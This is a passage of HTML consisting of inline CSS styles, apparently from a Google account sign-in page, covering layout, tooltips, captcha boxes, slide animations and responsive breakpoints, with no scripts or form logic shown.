  .shift-form.main-content {
  height: 391px;
;
  }
  .has-error.shift-form.main-content {
  height: 431px;
;
  }
  .shift-form.main-content.no-name {
  height: 371px;
;
  }
  .has-error.shift-form.main-content.no-name {
  height: 411px;
;
  }
  .has-captcha.shift-form.main-content {
  height: 561px;
;
  }
  .has-captcha.shift-form.main-content.no-name {
  height: 541px;
;
  }
  .has-captcha.shift-form.main-content.has-error {
  height: 601px;
;
  }
  .has-captcha.shift-form.main-content.has-error.no-name {
  height: 581px;
;
  }
.signin-card {
  width: 256px;
}
.signin-card #EmailFirst {
  margin-top: 15px;
}
.one-google {
  padding-top: 22px;
}
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .header .logo {
  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_2x.png);
  }
  .header .logo-w {
  background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_112x36dp.png);
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 86px;
  height: 86px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google .logo-strip {
  background-repeat: no-repeat;
  display: block;
  margin: 10px auto;
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png);
  background-size: 230px 17px;
  width: 230px;
  height: 17px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .one-google .logo-strip {
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_2x.png);
  }
</style>
<style>
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  top: 380px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("//ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style type="text/css">
.captcha-box {
  background: #fff;
  margin: 0 0 10px;
  overflow: hidden;
  padding: 10px;
}
.captcha-box .captcha-img {
  text-align: center;
}
.captcha-box .captcha-label {
  font-weight: bold;
  display: block;
  margin: .5em 0;
}
.captcha-box .captcha-msg {
  color: #999;
  display: block;
  position: relative;
}
.captcha-box .captcha-msg .accessibility-logo {
  float: right;
  border: 0;
}
.captcha-box .audio-box {
  position: absolute;
  top: 0;
}
</style>
<style>
.chromiumsync-custom-content {
  padding-top: 20px;
  margin-bottom: 0;
}
.form-panel {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -webkit-transform: translateZ(0);
  -moz-transform: translateZ(0);
  -ms-transform: translateZ(0);
  -o-transform: translateZ(0);
  transform: translateZ(0);
  position: absolute;
  width: 100%;
}
.form-panel.first {
  z-index: 2;
}
.form-panel.second {
  z-index: 1;
}
.shift-form .form-panel.first {
  z-index: 1;
}
.shift-form .form-panel.second {
  z-index: 2;
}
  .hide-form.slide-out {
  display: none;
  }
  .hide-form.slide-in {
  display: none;
  }
.slide-in,
.slide-out {
  display: block;
  -webkit-transition-property: -webkit-transform, opacity;
  -moz-transition-property: -moz-transform, opacity;
  -ms-transition-property: -ms-transform, opacity;
  -o-transition-property: -o-transform, opacity;
  transition-property: transform, opacity;
  -webkit-transition-duration: 0.1s;
  -moz-transition-duration: 0.1s;
  -ms-transition-duration: 0.1s;
  -o-transition-duration: 0.1s;
  transition-duration: 0.1s;
  -webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -moz-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -ms-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -o-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
}
.slide-out {
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.shift-form .slide-out {
  opacity: 0;
  -webkit-transform: translate3d(-120%, 0, 0);
  -moz-transform: translate3d(-120%, 0, 0);
  -ms-transform: translate3d(-120%, 0, 0);
  -o-transform: translate3d(-120%, 0, 0);
  transform: translate3d(-120%, 0, 0);
}
.slide-in {
  -webkit-transform: translate3d(120%, 0, 0);
  -moz-transform: translate3d(120%, 0, 0);
  -ms-transform: translate3d(120%, 0, 0);
  -o-transform: translate3d(120%, 0, 0);
  transform: translate3d(120%, 0, 0);
}
.shift-form .slide-in {
  opacity: 1;
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.error-msg {
  -webkit-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -moz-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -ms-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -o-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  height: auto;
  max-height: 0;
  opacity: 0;
}
.has-error .error-msg {
  max-height: 3.5em;
  margin-top: 10px;
  margin-bottom: 10px;
  opacity: 1;
  visibility: visible;
}
.back-arrow {
  position: absolute;
  top: 37px;
  width: 24px;
  height: 24px;
  display: none;
  cursor: pointer;
}
.back-arrow {
  border-style: none;
}
.shift-form.back-arrow {
  display: block;
}
#link-signup {
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signup{
  display: none;
}
#link-signin-different {
  display: none;
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signin-different {
  display: block;
}
.signin-card #profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 0;
  min-height: 1em;
}
.signin-card.no-name #profile-name {
  display: none;
}
.signin-card.no-name #email-display {
  line-height: initial;
  margin-bottom: 16px;
}
.signin-card #email-display {
  display: block;
  padding: 0px 8px;
  color: rgb(64, 64, 64);
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
.signin-card #Email {
  margin-top: 13px;
}
.need-help {
  float: right;
  text-align: right;
}
.form-panel {
  width: 274px;
  
}
#gaia_firstform {
  z-index: 2;
}
.signin-card {
  position: relative;
  overflow: hidden;
}
.signin-card #profile-name {
  color: #000;
}

.circle {
  -webkit-transition-property: -webkit-transform;
  -moz-transition-property: -moz-transform;
  -ms-transition-property: -ms-transform;
  -o-transition-property: -o-transform;
  transition-property: transform;
  -webkit-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -moz-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -ms-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -o-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  transition-timing-function: cubic-bezier(.645,.045,.355,1);
}
.circle {
  position: absolute;
  z-index: 101;
  height: 85px;
  width: 85px;
  border-radius: 50%;
  opacity: 0.99;
  overflow: hidden;
  background-repeat: no-repeat;
  background-position: center center;
}
.main {
  overflow: hidden;
}
.card-mask-wrap {
  position: relative;
  width: 360px;
  margin: 0 auto;
  z-index: 1;
}
.dasher-tooltip {
  position: absolute;
  left: 50%;
  margin-left: 150px;
}
.dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
}
.dasher-tooltip p {
  margin-top: 0;
}
.dasher-tooltip p span {
  display: block;
}

  .card-mask-wrap {
  -webkit-transition: transform 0.5s;
  -moz-transition: transform 0.5s;
  -ms-transition: transform 0.5s;
  -o-transition: transform 0.5s;
  transition: transform 0.5s;
  -webkit-transform: translate3d(0,
  -263px
, 0);
  -moz-transform: translate3d(0,
  -263px
, 0);
  -ms-transform: translate3d(0,
  -263px
, 0);
  -o-transform: translate3d(0,
  -263px
, 0);
  transform: translate3d(0,
  -263px
, 0);
;
  }
  .card-mask-wrap.has-captcha {
  -webkit-transform: translate3d(0,
  -93px
, 0);
  -moz-transform: translate3d(0,
  -93px
, 0);
  -ms-transform: translate3d(0,
  -93px
, 0);
  -o-transform: translate3d(0,
  -93px
, 0);
  transform: translate3d(0,
  -93px
, 0);
;
  }
  .card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -223px
, 0);
  -moz-transform: translate3d(0,
  -223px
, 0);
  -ms-transform: translate3d(0,
  -223px
, 0);
  -o-transform: translate3d(0,
  -223px
, 0);
  transform: translate3d(0,
  -223px
, 0);
;
  }
  .card-mask-wrap.has-captcha.has-error {
  -webkit-transform: translate3d(0,
  -53px
, 0);
  -moz-transform: translate3d(0,
  -53px
, 0);
  -ms-transform: translate3d(0,
  -53px
, 0);
  -o-transform: translate3d(0,
  -53px
, 0);
  transform: translate3d(0,
  -53px
, 0);
;
  }
  .shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -222px
, 0);
  -moz-transform: translate3d(0,
  -222px
, 0);
  -ms-transform: translate3d(0,
  -222px
, 0);
  -o-transform: translate3d(0,
  -222px
, 0);
  transform: translate3d(0,
  -222px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -182px
, 0);
  -moz-transform: translate3d(0,
  -182px
, 0);
  -ms-transform: translate3d(0,
  -182px
, 0);
  -o-transform: translate3d(0,
  -182px
, 0);
  transform: translate3d(0,
  -182px
, 0);
;
  }
  .shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -242px
, 0);
  -moz-transform: translate3d(0,
  -242px
, 0);
  -ms-transform: translate3d(0,
  -242px
, 0);
  -o-transform: translate3d(0,
  -242px
, 0);
  transform: translate3d(0,
  -242px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -202px
, 0);
  -moz-transform: translate3d(0,
  -202px
, 0);
  -ms-transform: translate3d(0,
  -202px
, 0);
  -o-transform: translate3d(0,
  -202px
, 0);
  transform: translate3d(0,
  -202px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -52px
, 0);
  -moz-transform: translate3d(0,
  -52px
, 0);
  -ms-transform: translate3d(0,
  -52px
, 0);
  -o-transform: translate3d(0,
  -52px
, 0);
  transform: translate3d(0,
  -52px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -72px
, 0);
  -moz-transform: translate3d(0,
  -72px
, 0);
  -ms-transform: translate3d(0,
  -72px
, 0);
  -o-transform: translate3d(0,
  -72px
, 0);
  transform: translate3d(0,
  -72px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -12px
, 0);
  -moz-transform: translate3d(0,
  -12px
, 0);
  -ms-transform: translate3d(0,
  -12px
, 0);
  -o-transform: translate3d(0,
  -12px
, 0);
  transform: translate3d(0,
  -12px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error.no-name {
  -webkit-transform: translate3d(0,
  -32px
, 0);
  -moz-transform: translate3d(0,
  -32px
, 0);
  -ms-transform: translate3d(0,
  -32px
, 0);
  -o-transform: translate3d(0,
  -32px
, 0);
  transform: translate3d(0,
  -32px
, 0);
;
  }
  .main-content {
  height: 450px;
;
  }
  .main-content.has-captcha {
  height: 620px;
;
  }
  .main-content.has-error {
  height: 490px;
;
  }
  .main-content.has-captcha.has-error {
  height: 660px;
;
  }
  .shift-form.main-content {
  height: 491px;
;
  }
  .has-error.shift-form.main-content {
  height: 531px;
;
  }
  .shift-form.main-content.no-name {
  height: 471px;
;
  }
  .has-error.shift-form.main-content.no-name {
  height: 511px;
;
  }
  .has-captcha.shift-form.main-content {
  height: 661px;
;
  }
  .has-captcha.shift-form.main-content.no-name {
  height: 641px;
;
  }
  .has-captcha.shift-form.main-content.has-error {
  height: 701px;
;
  }
  .has-captcha.shift-form.main-content.has-error.no-name {
  height: 681px;
;
  }
  .card-mask {
  background-color: #fff;
  background-position: 50% 0;
  background-repeat: no-repeat;
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAWgAAAAGCAIAAABhDpMcAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gkeFxks6YflLAAAAKlJREFUWMPt2CEShDAMheGmMCFV1MH9z8MtarC4QKfNiuwwOyxHeJ9r6iJ+ETKz3vu+7/M8D8MQAADetNaO41jXNcYYfUREpZRaK7YDAP9qraUUIvLn6NVg5t77tm2qamZYEwDciEhElmVhZm/H6B8ppZxzCOE8T4QDAB7hmKYp55xS+k48E601VVXV67oQDgB4hIOZRURE/BJKv5kwM1QDAF7bcR84Qggf4ShHovU/ogcAAAAASUVORK5CYII=);
  min-height: 300px;
  }
.card {
  margin-bottom: 0;
}
.one-google {
  padding-top: 27px;
}
#canvas {
  -webkit-transition: opacity 0.075s;
  -moz-transition: opacity 0.075s;
  -ms-transition: opacity 0.075s;
  -o-transition: opacity 0.075s;
  transition: opacity 0.075s;
  opacity: 0.01;
}
.shift-form #canvas {
  opacity: 0.99;
}
.label {
  color: #404040;
}
#account-chooser-link {
  -webkit-transition: opacity 0.3s;
  -moz-transition: opacity 0.3s;
  -ms-transition: opacity 0.3s;
  -o-transition: opacity 0.3s;
  transition: opacity 0.3s;
}
.input-wrapper {
  position: relative;
}
.google-footer-bar {
  z-index: 2;
}
</style>
<style media="screen and (max-width: 580px)">
.back-arrow {
  top: 17px;
}
.circle-mask {
  height: 72px;
  width: 72px;
  background-size: 72px;
}
.circle {
  height: 72px;
  width: 72px;
}
#canvas {
  height: 72px;
  width: 72px;
}
.form-panel {
  width: 256px;
}
.card-mask-wrap {
  width: 300px;
}
  .card-mask {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAS4AAAAGCAIAAADyquT7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNS4xIFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RDcyMjMyQ0NFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RDcyMjMyQ0RFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpENzIyMzJDQUU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpENzIyMzJDQkU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqGCc+MAAACnSURBVHja7Ng7DoQgFIXhYTAKFXS6//W4CxtaOh4B5sQ7mcwGpDpfpdjd5M9V1Rij9x5CcM5prV9ENEtrLcZ4HMcb5EgpdV1XrZXTIZoDuSE6pCe3i3S4rit243meKSXsSY6J6FGIzhiz7zvSkxoXeWCt9d7jIufMFIkmpLhtG6JDet8TCQ/vrOlWSmGKRBNSxD40N/lHo/7DGzeOiWhOjb8PRfgIMAAaYEeit6tkKwAAAABJRU5ErkJggg==);
  }
  .card-mask-wrap {
  -webkit-transform: translate3d(0,
  -288px
, 0);
  -moz-transform: translate3d(0,
  -288px
, 0);
  -ms-transform: translate3d(0,
  -288px
, 0);
  -o-transform: translate3d(0,
  -288px
, 0);
  transform: translate3d(0,
  -288px
, 0);
;
  }
  .card-mask-wrap.has-captcha {
  -webkit-transform: translate3d(0,
  -118px
, 0);
  -moz-transform: translate3d(0,
  -118px
, 0);
  -ms-transform: translate3d(0,
  -118px
, 0);
  -o-transform: translate3d(0,
  -118px
, 0);
  transform: translate3d(0,
  -118px
, 0);
;
  }
  .card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -248px
, 0);
  -moz-transform: translate3d(0,
  -248px
, 0);
  -ms-transform: translate3d(0,
  -248px
, 0);
  -o-transform: translate3d(0,
  -248px
, 0);
  transform: translate3d(0,
  -248px
, 0);
;
  }
  .card-mask-wrap.has-captcha.has-error {
  -webkit-transform: translate3d(0,
  -78px
, 0);
  -moz-transform: translate3d(0,
  -78px
, 0);
  -ms-transform: translate3d(0,
  -78px
, 0);
  -o-transform: translate3d(0,
  -78px
, 0);
  transform: translate3d(0,
  -78px
, 0);
;
  }
  .shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -247px
, 0);
  -moz-transform: translate3d(0,
  -247px
, 0);
  -ms-transform: translate3d(0,
  -247px
, 0);
  -o-transform: translate3d(0,
  -247px
, 0);
  transform: translate3d(0,
  -247px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -207px
, 0);
  -moz-transform: translate3d(0,
  -207px
, 0);
  -ms-transform: translate3d(0,
  -207px
, 0);
  -o-transform: translate3d(0,
  -207px
, 0);
  transform: translate3d(0,
  -207px
, 0);
;
  }
  .shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -267px
, 0);
  -moz-transform: translate3d(0,
  -267px
, 0);
  -ms-transform: translate3d(0,
  -267px
, 0);
  -o-transform: translate3d(0,
  -267px
, 0);
  transform: translate3d(0,
  -267px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -227px
, 0);
  -moz-transform: translate3d(0,
  -227px
, 0);
  -ms-transform: translate3d(0,
  -227px
, 0);
  -o-transform: translate3d(0,
  -227px
, 0);
  transform: translate3d(0,
  -227px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -77px
, 0);
  -moz-transform: translate3d(0,
  -77px
, 0);
  -ms-transform: translate3d(0,
  -77px
, 0);
  -o-transform: translate3d(0,
  -77px
, 0);
  transform: translate3d(0,
  -77px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -97px
, 0);
  -moz-transform: translate3d(0,
  -97px
, 0);
  -ms-transform: translate3d(0,
  -97px
, 0);
  -o-transform: translate3d(0,
  -97px
, 0);
  transform: translate3d(0,
  -97px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -37px
, 0);
  -moz-transform: translate3d(0,
  -37px
, 0);
  -ms-transform: translate3d(0,
  -37px
, 0);
  -o-transform: translate3d(0,
  -37px
, 0);
  transform: translate3d(0,
  -37px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error.no-name {
  -webkit-transform: translate3d(0,
  -57px
, 0);
  -moz-transform: translate3d(0,
  -57px
, 0);
  -ms-transform: translate3d(0,
  -57px
, 0);
  -o-transform: translate3d(0,
  -57px
, 0);
  transform: translate3d(0,
  -57px
, 0);
;
  }
  .main-content {
  height: 350px;
;
  }
  .main-content.has-captcha {
  height: 520px;
;
  }
  .main-content.has-error {
  height: 390px;
;
  }
  .main-content.has-captcha.has-error {
  height: 560px;
;
  }
  .shift-form.main-content {
  height: 391px;
;
  }
  .has-error.shift-form.main-content {
  height: 431px;
;
  }
  .shift-form.main-content.no-name {
  height: 371px;
;
  }
  .has-error.shift-form.main-content.no-name {
  height: 411px;
;
  }
  .has-captcha.shift-form.main-content {
  height: 561px;
;
  }
  .has-captcha.shift-form.main-content.no-name {
  height: 541px;
;
  }
  .has-captcha.shift-form.main-content.has-error {
  height: 601px;
;
  }
  .has-captcha.shift-form.main-content.has-error.no-name {
  height: 581px;
;
  }
.signin-card {
  width: 256px;
}
.signin-card #EmailFirst {
  margin-top: 15px;
}

.one-google {
  padding-top: 22px;
}
</style>
  </head>
<body>
<style>
.circle-mask {
  display: block;
  height: 85px;
  width: 85px;
  overflow: hidden;
  border-radius: 50%;
  margin-left: auto;
  margin-right: auto;
  z-index: 90;
  margin-bottom: 10px;
  background-size: 85px;
  background-repeat: no-repeat;
